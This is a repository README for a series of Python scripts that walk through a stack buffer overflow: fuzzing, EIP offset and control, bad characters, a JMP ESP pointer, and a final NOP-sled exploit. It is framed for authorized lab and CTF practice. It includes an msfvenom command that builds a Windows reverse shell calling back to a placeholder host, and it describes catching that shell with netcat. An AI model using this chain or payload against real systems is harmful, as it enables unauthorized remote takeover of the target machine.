# Hack-the-Stack
This repository contains a collection of Python scripts designed to assess and exploit programs that are susceptible to buffer overflow attacks.

Disclaimer: The scripts below are intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.



### Usage Notes:

If you have any doubts about how to use any of the scripts below or want some clarification on how to perform some of the steps (ex: reading the EIP register value, finding bad characters, etc...) you can go [check out some of my writeups of the THM machines](https://github.com/franlupo/pentest_walkthoughs/tree/main/Machines/THM) (Buffer Overflow Prep, Brainstrom, Gatekeeper, Brainpan 1).   



### 1. Crash Fuzzer

This is a Python script for fuzz testing a remote server by sending various buffer sizes to the target application. The script takes three arguments: an IP address, a port number, and an optional increment flag. 

It runs the target program multiple times, each time with a different buffer size, in an attempt to crash the target
program. The IP address and port number must be provided when running the script, and the increment flag can be optionally specified to set the step size for the buffer size increases. By default, the increment value is set to 100 bytes. 

The purpose of this script is to test the robustness of the target program by simulating various attack scenarios. 

Usage:

```
01_crash_fuzzer.py <ip> <port> [-i INCREMENT]
01_crash_fuzzer.py 127.0.0.1 1234
01_crash_fuzzer.py 127.0.0.1 1234 -i 1000
```

> Positional arguments:
>   ip - IP address of the target
>   port - Port number of the target
>
> Optional arguments:
>   -i/--increment INCREMENT - Increment value to be used, default is 100



### 2. Manual Crash

This is a Python script that attemps to crash a remote server's process by sending a fixed buffer size. The script takes three arguments: an IP address, a port number, and a buffer size in bytes. The purpose of this script is to test the robustness of the target program.

Usage:

```
02_manual_crash.py <ip> <port> <size>
02_manual_crash.py 127.0.0.1 1234 2000
```

> Positional arguments:
> ip - IP address of the target
> port - Port number of the target
> size - Buffer size in bytes



### 3. EIP Offset

This is a Python script for controlling the eip of a process in a remote server by filling the target application's buffer with a cyclic pattern. 

The script takes three arguments: an IP address, a port number, and an overflow threshold. It takes advantage of the metasploit framework exploit /patter_create.rb and /pattern_offset.rb. 

After the target application crashes, the script will ask the user for the value of the EIP address (format: FFFFFFFF) so that it can calculate the offset value.

**NOTE: Edit the script with the metasploit exploit location in your environment if you are getting an error. It assumes both exploits are located in the following directory "/usr/share/metasploit-framework/tools/exploit/".**

Usage:

```
03_eip_offset.py <ip> <port> <overflow_threshold>
03_eip_offset.py 127.0.0.1 1234 2000
```

> Positional arguments:
>   ip - IP address of the target
>   port - Port number of the target
>   overflow_threshold  Payload size which is able to crash the target application



### 4. EIP Control

This is a Python script for testing if the eip offset and overflow threshold provided are enough to take control of the EIP. 

The script takes four arguments: an IP address, a port number, the EIP offset and an overflow threshold. After executing the script the EIP register should be populated with 42424242.

Usage:

```
04_eip_offset.py <ip> <port> <offset> <overflow_threshold>
04_eip_offset.py 127.0.0.1 1234 2000
```

> positional arguments:
> ip - IP address of the target
> port - Port number of the target
> offset - Number of bytes inside the buffer until reaching the return address
> overflow_threshold - Payload size which is able to crash the target application



### 5. Finding Bad Characters

This is a Python script for finding what bad characters exists that cannot be interpreted by the target application running on the remote server. 

The script takes four arguments: an IP address, a port number, the EIP offset and an overflow threshold. After executing the script the EIP register should be populated with 42424242. 

The user should inspect the call stack and try to identify what characters are bad. This should be an iterative process and you should run this script with different sets characters to build up your bad character list.

**NOTE: The bad character list is an array that is initialized in the main function of the script. After identifying a bad character it should be added to the array like "\xff".**

Usage:

```
05_bad_characters.py <ip> <port> <offset> <overflow_threshold>
05_bad_characters.py 127.0.0.1 1234 1978 2000
```

> positional arguments:
> IP - IP address of the target
> Port - Port number of the target
> offset - Number of bytes inside the buffer until reaching the return address
> overflow_threshold - Payload size which is able to crash the target application



### 6. Jump Pointer

This is a Python script for checking if we our EIP is being filled with the address to the JMP ESP instruction we passed as an argument. 

The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address to the JMP ESP instruction. After executing the script the EIP register should be populated with the value we uncovered with the previous scripts.

Usage:

```
06_jmp_pointer.py <ip> <port> <offset> <overflow_threshold> <jmp_esp>
06_jmp_pointer.py 127.0.0.1 1234 1978 2000 0x652011AF
```

> Positional arguments:
> ip - IP address of the target
> Port - Port number of the target
> offset - Number of bytes inside the buffer until reaching the return address
> overflow_threshold - Payload size which is able to crash the target application
> jmp_esp - Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)



### 7. Nop Sleds/Exploit

This is a Python script for executing a buffer overflow on a target service of a remote server. The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address of the JMP ESP instruction which we identified does not have correct protection applied. 

After launching a local netcat listener to the port described in the payload we should be able to get a shell on the target server.

**NOTE: The script has a shellcode variable that should be replaced by the shellcode that you generated with msfvenom.**

Example:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py -v shellcode
```

> -b: bad characters to ommit
>
> -f: python format
>
> -v: variable name

Usage:

```
07_nop_sleds.py <ip> <port> <offset> <overflow_threshold> <jmp_esp>
07_nop_sleds.py 127.0.0.1 1234 1978 2000 0x652011AF
```

> Positional arguments:
> ip - IP address of the target
> port - Port number of the target
> offset - Number of bytes inside the buffer until reaching the return address
> overflow_threshold - Payload size which is able to crash the target application
> jmp_esp - Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)
